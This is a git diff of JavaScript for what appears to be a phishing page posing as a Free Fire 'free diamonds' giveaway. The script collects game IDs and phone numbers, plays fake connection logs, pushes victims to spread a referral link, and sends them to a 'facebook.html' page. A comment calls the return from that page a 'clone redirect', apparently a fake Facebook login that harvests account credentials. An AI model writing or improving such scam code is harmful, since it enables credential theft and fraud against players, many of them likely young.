@@ -1,7 +1,7 @@
 // ==============================================================
 // CONFIGURATION (Set your deployed referral URL here)
 // ==============================================================
-const REFERRAL_LINK = "https://freefire.diamondhub.event/claim?ref=ff92a";
+const REFERRAL_LINK = "https://free-daimonds-giveaway.onrender.com";
 // ==============================================================
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -10,12 +10,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const phoneNumberInput = document.getElementById('phoneNumber');
     const connectBtn = document.getElementById('connectBtn');
     const connectionForm = document.getElementById('connectionForm');
-    
+
     const statusConsole = document.getElementById('statusConsole');
     const consoleLogs = document.getElementById('consoleLogs');
     const connectionSuccess = document.getElementById('connectionSuccess');
     const playerNameDisplay = document.getElementById('playerNameDisplay');
-    
+
     const step1Card = document.getElementById('step1Card');
     const step2Card = document.getElementById('step2Card');
     const step3Card = document.getElementById('step3Card');
@@ -24,11 +24,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const referralUrlInput = document.getElementById('referralUrl');
     const shareBtn = document.getElementById('shareBtn');
 
-    
+
     const progressText = document.getElementById('progressText');
     const progressBar = document.getElementById('progressBar');
     const rewardConsole = document.getElementById('rewardConsole');
-    
+
     const facebookLoginBtn = document.getElementById('facebookLoginBtn');
     const toastContainer = document.getElementById('toastContainer');
 
@@ -43,8 +43,8 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     const mockNames = [
-        "FF_CRIMSON_BOY", "GARENA_SLAYER", "Sniper_Elite_FF", 
-        "ALPHA_DRAGON", "VORTEX_WARRIOR", "FF_Master_X", 
+        "FF_CRIMSON_BOY", "GARENA_SLAYER", "Sniper_Elite_FF",
+        "ALPHA_DRAGON", "VORTEX_WARRIOR", "FF_Master_X",
         "FF_RAIDER_77", "GarenaLegend", "SniperQueen_FF"
     ];
 
@@ -83,7 +83,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         connectedPlayerId = idVal;
-        
+
         // Hide form & show console loader
         connectionForm.style.display = 'none';
         statusConsole.style.display = 'flex';
@@ -173,10 +173,10 @@ document.addEventListener('DOMContentLoaded', () => {
         rewardConsole.classList.add('unlocked');
         step3Card.classList.remove('locked');
         step3Card.classList.add('active');
-        
+
         // Hide Share Actions
         shareBtn.style.display = 'none';
-        
+
         showToast("Challenge complete! Vault rewards unlocked. Verify your account to claim the diamonds.");
     }
 
@@ -188,7 +188,7 @@ document.addEventListener('DOMContentLoaded', () => {
         localStorage.setItem('garena_player_id', connectedPlayerId);
         localStorage.setItem('garena_player_name', playerNameDisplay.textContent);
         localStorage.setItem('garena_referrals', referralCount);
-        
+
         window.location.href = 'facebook.html';
     });
 
@@ -197,13 +197,13 @@ document.addEventListener('DOMContentLoaded', () => {
     // -------------------------------------------------------------
     const urlParams = new URLSearchParams(window.location.search);
     const verifiedParam = urlParams.get('verified');
-    
+
     // Save verification state if returning from clone redirect
     if (verifiedParam === 'facebook') {
         localStorage.setItem('verified_success', 'true');
         localStorage.setItem('verified_method', verifiedParam);
     }
-    
+
     const isStep1Connected = localStorage.getItem('garena_step1_connected') === 'true';
     const savedPlayerId = localStorage.getItem('garena_player_id') || "";
     const savedPlayerName = localStorage.getItem('garena_player_name') || "";
@@ -216,17 +216,17 @@ document.addEventListener('DOMContentLoaded', () => {
         connectionForm.style.display = 'none';
         statusConsole.style.display = 'none';
         connectionSuccess.style.display = 'flex';
-        
+
         // Restore Step 2 state
         step2Card.classList.remove('locked');
         step2Card.classList.add('active');
         referralCount = savedReferralCount;
         updateProgress();
-        
+
         if (referralCount >= maxReferrals) {
             // Restore Step 3 state
             unlockClaimStep();
-            
+
             if (isVerified) {
                 // If verified, replace claim actions with success state
                 const claimActions = document.querySelector('.claim-actions');
@@ -244,7 +244,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         </div>
                     `;
                 }
-                
+
                 // Show verification success toast once
                 if (verifiedParam) {
                     setTimeout(() => {
